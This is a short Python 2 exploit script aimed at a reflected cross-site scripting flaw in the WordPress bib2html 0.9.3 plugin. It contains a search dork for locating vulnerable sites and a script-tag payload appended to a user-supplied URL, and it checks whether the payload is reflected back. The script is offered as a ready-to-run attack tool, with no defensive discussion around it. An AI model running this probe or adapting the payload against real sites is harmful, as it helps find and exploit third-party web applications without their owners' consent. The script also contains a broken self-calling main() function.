#!/usr/bin/env python

import urllib2

def banner():
	print '''
	-- UrduSecurity Exploits --
	-- Title: Wordpress bib2html 0.9.3 XSS Vulnerability exploit--
	-- Found By Ashyane Digital Security Team -- 
	-- Dork: [wp-content/plugins/bib2html/OSBiB/create/index.php?action=adminStyleAdd&styleShortName= --
	-- Author: Muhammad Adeel --
	--Blog: http://urdusecurity.blogspot.com --\n'''

banner()
url = raw_input('Enter URL[wp-content/plugins/bib2html/OSBiB/create/index.php?action=adminStyleAdd&styleShortName=]:')
payload = "\"/><script>alert(1);</script>"
attack_url = url + payload
xss = "<script>alert(1);</script>"

def POC():
	req = urllib2.urlopen(attack_url)
	if xss in req.read():
		print "Done!"
	else:
		print "Patched!"
	raw_input('hit ENTER to exit')
	banner()

POC()

def main():
	banner()
	if __name__ == '__main__':
		main()
